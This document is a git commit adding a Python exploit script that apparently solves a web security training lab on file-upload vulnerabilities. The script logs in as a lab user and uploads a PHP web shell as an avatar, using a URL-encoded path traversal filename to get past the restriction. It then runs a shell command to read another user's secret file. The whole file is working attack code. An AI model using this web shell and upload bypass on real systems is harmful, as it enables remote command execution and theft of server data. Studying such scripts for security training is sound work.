7d2a27c1fb692fb27a518222e74655a7e491239f
Rana Khalil <ranakhalil101@gmail.com>
2023-02-23 15:47:47 -0500

    Add files via upload

---
+++ file-upload-vulnerabilities/lab-03/file-upload-lab-03.py
@@ -0,0 +1,71 @@
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+import random, string
+from requests_toolbelt import MultipartEncoder
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def get_csrf_token(s, url):
+
+    r = s.get(url, verify=False, proxies=proxies)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    csrf = soup.find("input", {'name': 'csrf'})['value']
+    return csrf
+
+def exploit_file_upload(s, url):
+
+    # Get CSRF token
+    login_url = url + '/login'
+    csrf_token = get_csrf_token(s, login_url)
+
+    # Login as wiener
+    print("(+) Logging in as the wiener user...")
+    data_login = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
+    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
+
+    if 'Log out' in r.text:
+        print("(+) Successfully logged in as the wiener user...")
+
+        # Uploading avatar
+        print("(+) Uploading web shell...")
+        my_account_url = url + '/my-account'
+        csrf_token = get_csrf_token(s, my_account_url)
+        avatar_url = url + '/my-account/avatar'
+        params = {'avatar': ('..%2ftest.php', "<?php system($_GET['cmd']); ?>", "application/x-php"),
+        'user': 'wiener',
+        'csrf': csrf_token}
+
+        boundary = '------WebKitFormBoundary' + ''.join(random.sample(string.ascii_letters + string.digits, 16))
+
+        m = MultipartEncoder(fields=params, boundary=boundary)
+
+        headers = {'Content-Type': m.content_type}
+
+        r = s.post(avatar_url, data=m, headers=headers, verify=False, proxies=proxies)
+
+        # Execute web shell
+        print("(+) The following is the content of the secret file: ")
+        cmd_url = url + '/files/test.php?cmd=cat /home/carlos/secret'
+        r = s.get(cmd_url, verify=False, proxies=proxies)
+        print(r.text)
+    else:
+        print("(-) Could not login as user.")
+        sys.exit(-1)
+
+
+def main():
+    if len(sys.argv) !=2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+    
+    s = requests.Session()
+    url = sys.argv[1]
+    exploit_file_upload(s, url)
+
+if __name__ == "__main__":
+    main()
